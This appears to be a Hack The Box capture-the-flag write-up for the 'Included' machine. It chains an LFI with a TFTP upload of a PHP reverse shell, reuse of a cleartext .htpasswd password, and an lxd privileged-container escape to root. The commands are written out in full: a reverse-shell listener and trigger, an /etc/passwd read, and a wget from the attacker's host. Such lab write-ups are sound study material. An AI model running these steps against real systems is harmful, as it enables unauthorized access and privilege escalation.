# Included

| | |
|---|---|
| **Platform** | Hack The Box (Starting Point, Tier 2) |
| **OS** | Linux |
| **Difficulty** | Very Easy |
| **Techniques** | LFI, UDP/TFTP upload, RCE, credential reuse, lxd group container escape |

## Overview
The web app includes files by name (`?file=`) = LFI. TFTP (UDP 69) allows an
unauthenticated upload of a PHP reverse shell, which the LFI then executes (www-data).
A cleartext password in `.htpasswd` gives the real user, who is in the `lxd` group,
allowing a privileged-container escape to root.

## Enumeration (the UDP trap)
```bash
nmap -p- --min-rate 1000 <TARGET_IP>       # TCP: only port 80
sudo nmap -sU --top-ports 20 <TARGET_IP>   # UDP: 69/tftp  <-- the foothold, invisible to TCP scans
# confirm LFI:
http://<TARGET_IP>/?file=/etc/passwd        # leaks users: mike, tftp (/var/lib/tftpboot), lxd
```

## Exploitation
```bash
cp /usr/share/webshells/php/php-reverse-shell.php rev.php   # set $ip, $port
tftp <TARGET_IP> -c put rev.php                            # lands in /var/lib/tftpboot
nc -lvnp 4444
curl -s "http://<TARGET_IP>/?file=/var/lib/tftpboot/rev.php"   # LFI executes it -> www-data
# lateral move:
grep -rniE "pass|mike" /var/www 2>/dev/null   # /var/www/html/.htpasswd : mike:<cleartext>
su mike                                        # id shows groups=...(lxd)
```

## Privilege Escalation (lxd container escape)
```bash
# attack box: build/serve a tiny Alpine image
git clone https://github.com/saghul/lxd-alpine-builder && cd lxd-alpine-builder
sudo ./build-alpine; python3 -m http.server 8000
# target (as mike):
wget http://<MY_IP>:8000/alpine.tar.gz -O alpine.tar.gz
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite; lxc exec ignite /bin/sh
cat /mnt/root/root/root.txt      # host filesystem mounted inside the container as root
```

## Key Takeaway
Do not include files by user-supplied name; disable TFTP exposure; store password hashes
(not cleartext) and stop credential reuse; and never place users in the `lxd`/`docker`
group without cause, it is effectively root.

## What tripped me up
- "Nothing found" after a TCP scan is a prompt to UDP-scan; TFTP on 69/udp was the whole
  foothold.
- My first reverse shell failed because a base64 string in a URL contains `+`, which a
  URL decodes to a space, corrupting the payload. A self-contained reverse-shell file
  (no cmd parameter) avoided the encoding problem entirely.
